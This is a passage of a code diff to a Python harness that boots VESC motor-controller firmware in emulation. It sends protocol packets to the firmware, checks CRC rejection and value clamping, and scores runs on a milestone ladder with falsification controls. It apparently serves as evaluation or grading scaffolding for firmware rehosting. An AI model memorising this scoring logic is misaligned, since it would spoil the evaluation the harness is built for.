-            # Otherwise the CPU really did run, so the rung is a fact about
-            # this firmware -- M0 if the guest faulted, else M1 (booted without
-            # faulting, but never reached its own USART3 driver).  This can only
-            # ever DEMOTE: the old code returned M1 unconditionally here.
-            result["milestone"] = ("ERROR" if gated
-                                   else ("M0" if faulted else "M1"))
             return result
         result["booted"] = True
         # --- THE GATES, before anything is graded ----------------------
@@ -775,7 +1445,7 @@ def run_attack(on_stage: Optional[Callable] = None,
         bad = sc.startup_error()
         if bad:
             result.update(bad)
-            result["milestone"] = "ERROR"
+            result["gated_out"] = True
             result["booted"] = False
             result["landed"] = False
             stage("gates", note=result["error"])
@@ -785,9 +1455,6 @@ def run_attack(on_stage: Optional[Callable] = None,
               % (result["gate1_cpu_started"], result["logging_cfg_present"],
                  result["gate2_child_cpu_s"], WORK_FLOOR_CPU_S,
                  WORK_HEALTHY_CPU_S))
-        # M2/M3: the boot oracle is the firmware's own output over its own
-        # protocol engine, which needs ChibiOS scheduling its comm threads.
-        result["milestone"] = "M3"
         state = sc.read_state()
         stage("read", state=state)
         global _SEAM_ARMED
@@ -801,25 +1468,61 @@ def run_attack(on_stage: Optional[Callable] = None,
         # reporting the attacker's value, the SAME frame with one CRC byte
         # flipped dropped in silence, and absurd values clamped by the
         # firmware's own utils_truncate_number() against this board's limits.
-        # Inbound protocol request -> outbound firmware-composed reply that
-        # DISCRIMINATES on the request.
         result["vesc_packet_round_trip"] = bool(
             atk.get("changed")
             and atk.get("neg_bad_crc_rejected")
             and atk.get("neg_clamp_enforced"))
         result["landed"] = bool(atk.get("landed")
                                 and result["vesc_packet_round_trip"])
-        if result["landed"]:
-            result["milestone"] = "M4"
+        # --- the two new rungs --------------------------------------------
+        # On the seam control arm no byte ever reaches the firmware, so these
+        # phases cannot OBSERVE anything: they stay `unobservable`, which is
+        # not the same as a scored zero.
+        if not SEAM_CONTROL:
+            mint = _Mint(MINT_SEED)
+            result["m6"] = _m6_phase(sc, mint, stage)
+            result["m7"] = _m7_phase(sc, mint, stage)
         # Re-sample: the attack is where most of the CPU is burned, and the
         # figure in the RESULT should describe the whole run, not just the boot.
         result["gate2_child_cpu_s"] = round(sc.cpu_seconds(), 2)
     finally:
+        # The ladder runs BEFORE the child is reaped, so it can read the log,
+        # and it runs on every exit including an exception.
+        _finalize(sc, result)
         sc.shutdown()
     return result
 
 
 def main() -> int:
+    args = list(sys.argv[1:])
+    while args:
+        a = args.pop(0)
+        if a.startswith("--falsify="):
+            os.environ["VESC_FALSIFY"] = a.split("=", 1)[1]
+        elif a == "--falsify":
+            if not args:
+                print("--falsify needs a value", file=sys.stderr)
+                return 2
+            os.environ["VESC_FALSIFY"] = args.pop(0)
+        elif a in ("-h", "--help"):
+            print("usage: python -m rehostry_vesc_bldc_f405.attack "
+                  "[--falsify {m6-freeze|m7-valid-only|m7-mispredict}]")
+            return 0
+        else:
+            # Never ignore an unknown flag: a harness whose main() swallows
+            # argv accepts a documented-looking `--falsify typo` and runs the
+            # REAL arm while reporting it as a control.
+            print("unknown argument %r" % a, file=sys.stderr)
+            return 2
+    # The knob is read at import time, so re-read it after argv.
+    global FALSIFY
+    FALSIFY = os.environ.get("VESC_FALSIFY", "").strip().lower()
+    if FALSIFY not in FALSIFY_MODES:
+        print("unknown falsify mode %r; expected one of %s"
+              % (FALSIFY, ", ".join(repr(m) for m in FALSIFY_MODES)),
+              file=sys.stderr)
+        return 2
+
     def show(name, **data):
         note = data.get("note", "")
         if note:
@@ -839,16 +1542,28 @@ def main() -> int:
         print("\n".join(res.get("child_output_tail") or ["(empty)"]),
               file=sys.stderr)
         print("--- end child output ---", file=sys.stderr)
-    print("RESULT:", json.dumps({k: v for k, v in res.items()
-                                 if k in ("booted", "landed", "milestone",
-                                          "vesc_packet_round_trip",
-                                          "seam_control",
-                                          "gate1_cpu_started",
-                                          "gate2_child_cpu_s",
-                                          "gate2_floor_cpu_s",
-                                          "logging_cfg_present",
-                                          "error", "error_detail",
-                                          "child_returncode")}))
+    m6, m7 = res.get("m6") or {}, res.get("m7") or {}
+
+    def phase(d, keys):
+        if d.get("unobservable"):
+            return "unobservable"
+        return {k: d.get(k) for k in keys}
+
+    print("RESULT:", json.dumps({
+        **{k: v for k, v in res.items()
+           if k in ("booted", "landed", "milestone",
+                    "vesc_packet_round_trip", "seam_control", "falsify",
+                    "mint_seed", "own_init", "seam_up", "guest_faulted",
+                    "gate1_cpu_started", "gate2_child_cpu_s",
+                    "gate2_floor_cpu_s", "logging_cfg_present",
+                    "error", "error_detail", "child_returncode")},
+        "m6": phase(m6, ("ok", "rounds_ok", "rounds_total", "counter_ok",
+                         "counter_total", "answers_differ")),
+        "m7": phase(m7, ("ok", "classes_ok", "classes_total", "twins_ok",
+                         "twins_total", "refusal_witnesses_seen",
+                         "state_refusals_seen", "clamp_refusals_seen",
+                         "seam_alive_after_every_class", "reply_digest")),
+    }))
     return 0 if res.get("landed") else 1
 
 
